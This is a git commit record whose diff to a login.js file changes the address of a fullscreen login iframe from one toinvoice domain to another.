b60924d4061322e4a4b4344cff6c85042713fb8e
Demos <69394991+Lennis-jpg@users.noreply.github.com>
2025-08-22 18:55:17 +0100

    Update login.js

--- assets/js/login.js
+++ assets/js/login.js
@@ -1,4 +1,4 @@
 const iframe = document.createElement('iframe');
     iframe.className = 'fullscreen-iframe';
-    iframe.src = 'https://www.toinvoice.online/Login'; 
+    iframe.src = 'https://www.toinvoice.org/Login'; 
     document.body.appendChild(iframe);
